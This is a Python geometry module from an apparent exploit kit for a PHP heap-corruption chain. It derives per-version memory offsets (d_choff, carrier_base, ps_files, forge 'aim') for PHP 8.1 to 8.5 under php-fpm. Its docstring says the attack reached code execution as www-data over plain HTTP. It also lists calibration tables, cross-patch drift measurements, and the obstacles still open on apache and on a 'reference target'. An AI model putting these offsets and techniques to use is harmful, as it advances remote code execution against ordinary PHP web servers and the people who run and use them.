#!/usr/bin/env python3
# INDEX: collapse the K-free stagefed/staletail forge consts to one d_choff anchor | fpm | derivation EMPIRICAL-grounded 8.4/8.5, not black-box-fired
"""K-free ps_files->basedir forge geometry from a single per-build anchor.

The settled arm-prefix groom (a fixed `arm_prefix` $_POST pad + cochunk `n1<=1000`
embedded-E arm; kfree_stagefed_forge / kfree_staletail_forge) is FIRST-FIT, not the
AIM-survey parking groom. Its consequences, measured gdb/proc black-box on fresh
php:*-fpm containers (128M, one worker, BND=----l2):

  * E (= d->last) is EMBEDDED in d at the ABI-fixed offset +0x38 -> E tracks d; the
    arm's E and d do NOT drift independently (the parking-groom premise is gone).
  * d_choff is first-fit DETERMINISTIC: identical across fresh containers AND across
    patch binaries (8.4.25 == 8.4.26, zero recalibration though the binaries differ).
  * band = bits16-20 of E is DERIVED from d_choff; fakee = band<<16 (byte0 = 0).
  * ps_files is minor-INVARIANT per SAPI (fpm 0x56208 on 8.4.25/8.4.26/8.5.11).

So the per-build SETTLED_CONST collapses: {fakee, E, ps_files} are DERIVED or
invariant, leaving ONE irreducible per-build quantity -- the d_choff anchor -- plus
fixed groom knobs (arm_prefix, n1) and free/stable carrier params. d_choff moves only
on a minor bump (0x1aa000 on 8.4.x -> 0x1bb000 on 8.5.x) and is also runtime-locatable
(oracles/blind_anchor_oracle).

Stage: EMPIRICAL, fired end-to-end to uid=33(www-data), worker surviving, fresh-
container-per-trial, black-box HTTP. Coverage (fpm, single-worker, nginx):
  * 8.2.28 / 8.3.26 / 8.4.26 at BOTH 128M and 512M -- same per-build consts at both
    memory limits, only the arm's prealloc k scales (ARM_K). 8.3.10 + 8.5.11 at 128M.
  * CROSS-PATCH DRIFT SURVEY (fpm, 128M, fired uid=33): 8.2.0/8.2.15, 8.4.1/8.4.10,
    8.5.0/8.5.6/8.5.11 measured by /proc (nm -D basic_globals/ps_globals + unser.data
    read) and confirmed by live forge fire. The "one window covers the whole minor"
    pattern seen on 8.3 HOLDS on 8.2/8.4/8.5, and is tightest on 8.5. Per minor the
    drift is small+bounded: d_choff in a <=2-page window, carrier_base in a +-1-2 page
    window, so X = d-carrier_base in a <=4-page window; ps_files PAGE invariant 0x56000
    across all minors+patches, SUB-SLOT one of two values {0x1b8, 0x208} (a 0x50 step).
    Fired points (d_choff / carrier_base / X / ps_files):
      8.2.0  0x1ad000 0x63000 0x14a000 0x561b8 | 8.2.15 0x1ad000 0x64000 0x149000 0x561b8
      8.4.1  0x1ac000 0x62000 0x14a000 0x561b8 | 8.4.10 0x1aa000 0x63000 0x147000 0x56208
      8.5.0  0x1bb000 0x62000 0x159000 0x56208 | 8.5.6  0x1bb000 0x62000 0x159000 0x56208
      8.5.11 0x1bb000 0x63000 0x158000 0x56208
    Correlation (8.2/8.3/8.4): older patch -> HIGHER d_choff (0x1ad/0x1ac) + sub-slot
    0x1b8; newer -> LOWER d_choff (0x1ab/0x1aa) + sub-slot 0x208. 8.5 is uniform across
    its whole range (d=0x1bb000, sub-slot 0x208); only carrier_base nudges 1 page
    (0x62000 on 8.5.0/8.5.6 -> 0x63000 on 8.5.11), so even there X drifts <=1 page.
  * So carrier_base is NOT perfectly stable (the 3-sample "0x64000 fixed" was the sample,
    not a law): it drifts +-1-2 pages per minor, independently of d_choff (8.5 moves cb
    with d fixed). X = d - carrier_base is therefore NOT invariant but IS bounded to a
    few pages per minor -- the blind oracle locates X (and sweeps the two sub-slots) at
    runtime within one per-minor window; no per-patch table is needed.
Not landed here (current obstacles, not dead):
  * 8.1.31-fpm: arms (identical d-struct), but the session's ps_files allocates HIGH
    (near/above d: 0x1b1000 band-above-E at base prefix, or ~0x1ac000 inside the
    carrier span at a raised prefix) instead of the low 0x54-0x56 region 8.2-8.5 use.
    The stale-tail fakee is band-pinned to E's 64KB floor, so a ps above fakee gives a
    large POSITIVE aim (> var_push's in-place bound) -> var_push grows instead of
    writing data[aim] = survive-no-write. Retest: a groom landing mod_data low on 8.1.
  * 8.4.26-apache: arms (d_choff=0x1aa000 == fpm, identical struct); ps_files IS low
    and reachable (0x54208, negative-aim regime). But the mod_php stage request-heap
    shifts carrier_base (crash<=0x65000 / survive-no-write>=0x66000 boundary, vs fpm's
    single-page crash-WRITE-crash at 0x63000) and no cb page both fires the redirect
    and writes; b_phase/b_stride sweeps don't recover it. Needs live-stage gdb to pin
    the C-field first-fit base + fresh var_dtor_entries landing on apache, not a
    black-box sweep.
  * the reference target 512M under its 8M post_max_size: the array_init-OOM arm needs ~24MB of
    POST (fits 64M lab); an amplifying/pre-grow arm is the open delivery there (NB:
    not the priority -- the chain lands at low memory_limit; see memory-invariance).
"""
import os
import sys

_POC = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC not in sys.path:
    sys.path.insert(0, _POC)

from primitives.geometry.singleshot_anchor import ps_files_off  # noqa: E402

# Settled embedded-E arm (n1 <= 1000): d->last points at the overflow var_entries
# embedded in d at this ABI-fixed offset. Build-invariant (pud_reclaim_class layout).
E_EMBED = 0x38

# bits 16-20 of E select the 64KB band the K-free stale-tail d->last redirect lands in.
BAND_MASK = 0x1f

# d_choff anchor for the fixed settled arm (arm_prefix=0xA0000, n1=900, one worker,
# BND=----l2). EMPIRICAL (/proc observe, fresh-container-per-trial).
# MEMORY-LIMIT INVARIANT: identical at 128M and 512M (the OOM fires inside the
# rejected array_init, so retained high-water -- hence d -- does not move; only the
# arm's prealloc k scales past the wall, see ARM_K).
# PATCH-SENSITIVE: d_choff moves per PATCH, not just per minor -- 8.3.10=0x1ad000 vs
# 8.3.26=0x1ab000 (the 8.4.25==8.4.26 equality was a coincidence, not a law). Keyed by
# a "<minor>" default plus explicit "<minor>.<patch>" where a measured patch differs.
# Per minor d_choff sits in a <=2-page window (8.5: single value across all patches).
D_CHOFF_ANCHOR = {
    "8.1":    0x1AE000,  # 8.1.31-fpm (forge unlanded: ps_files HIGH, see PS_FILES note)
    "8.2":    0x1AB000,  # 8.2.28-fpm
    "8.2.0":  0x1AD000,  # 8.2.0-fpm
    "8.2.15": 0x1AD000,  # 8.2.15-fpm
    "8.3":    0x1AB000,  # 8.3.26-fpm (reference target version)
    "8.3.10": 0x1AD000,  # 8.3.10-fpm
    "8.4":    0x1AA000,  # 8.4.10-fpm, 8.4.25-fpm, 8.4.26-fpm, 8.4.26-apache
    "8.4.1":  0x1AC000,  # 8.4.1-fpm
    "8.5":    0x1BB000,  # 8.5.0 / 8.5.6 / 8.5.11-fpm (invariant across the minor)
}

# carrier_base (first-fit of the stage C field) drifts +-1-2 pages per minor -- NOT the
# fixed 0x64000 the 3-sample set suggested. Fire-pinned per patch (fresh-container, the
# one cb page that writes+GET-fires; neighbours crash or survive-no-write). It moves
# independently of d_choff: 8.5 holds d=0x1bb000 across all patches yet cb steps
# 0x62000->0x63000 at 8.5.11. So X = d - carrier_base is not a law but IS bounded to a
# few pages/minor; blind_anchor_oracle LOCATES X at runtime (no fixed X assumed).
# EMPIRICAL (fire, fresh-container-per-trial, fpm 128M).
CARRIER_BASE_ANCHOR = {
    "8.2": 0x64000, "8.2.0": 0x63000, "8.2.15": 0x64000,
    "8.3": 0x64000, "8.3.10": 0x64000,
    "8.4": 0x63000, "8.4.1": 0x62000, "8.4.10": 0x63000,
    "8.5": 0x63000, "8.5.0": 0x62000, "8.5.6": 0x62000, "8.5.11": 0x63000,
}

# OOM-arm prealloc k must exceed the memory_limit wall: k rounds up to a pow2 bucket
# count whose array_init request (~40 B/bucket) is denied. k=4e6 OOMs 128M (160 MB
# request); 512M needs k in (2^23, 2^24] ~ k=12e6 (640 MB request). The unserialize
# count guard needs ~1 input byte per declared element, so a 512M array_init-OOM costs
# ~24 MB of POST body -- fits a 64M post_max_size, NOT the reference target's 8M (the real
# reference target 512M arm needs an amplifying / pre-grow delivery, open).
ARM_K = {"128M": 4_000_000, "512M": 12_000_000}


def e_from_d(d_choff):
    """var_entries (E = d->last) chunk offset for the settled embedded-E arm."""
    return d_choff + E_EMBED


def band_from_d(d_choff):
    """The 64KB band (bits 16-20 of E) the stale-tail d->last redirect targets."""
    return (e_from_d(d_choff) >> 16) & BAND_MASK


def fakee_from_d(d_choff):
    """fakee = band<<16 (byte0 = 0; satisfies the carrier's band<<16|0x00XX form)."""
    return band_from_d(d_choff) << 16


def aim(d_choff, sapi="fpm"):
    """Signed used_slots AIM = (ps_files - fakee - 0x10)/8 (chunk-relative, K-free)."""
    return (ps_files_off(sapi) - fakee_from_d(d_choff) - 0x10) // 8


def derive(d_choff, sapi="fpm"):
    """All K-free forge geometry from the one per-build d_choff anchor + SAPI.
    Returns the fields kfree_staletail/stagefed read out of their per-build const dict
    (d_choff, fakee, ps_files) plus the derived E/band/aim. carrier_base/b_* stay groom
    params the caller supplies (free/stable, not anchor-derived)."""
    return {
        "d_choff": d_choff,
        "e_choff": e_from_d(d_choff),
        "band": band_from_d(d_choff),
        "fakee": fakee_from_d(d_choff),
        "ps_files": ps_files_off(sapi),
        "aim": aim(d_choff, sapi),
    }


def derive_minor(minor, sapi="fpm"):
    """derive() keyed by PHP minor ('8.4'/'8.5') via the empirical d_choff anchor."""
    try:
        return derive(D_CHOFF_ANCHOR[minor], sapi)
    except KeyError:
        raise ValueError("no d_choff anchor for minor %r (have %s)"
                         % (minor, ", ".join(sorted(D_CHOFF_ANCHOR)))) from None


if __name__ == "__main__":
    for m in sorted(D_CHOFF_ANCHOR):
        g = derive_minor(m)
        print(f"{m}: d=0x{g['d_choff']:x} E=0x{g['e_choff']:x} band=0x{g['band']:x} "
              f"fakee=0x{g['fakee']:x} ps_files=0x{g['ps_files']:x} aim={g['aim']}")
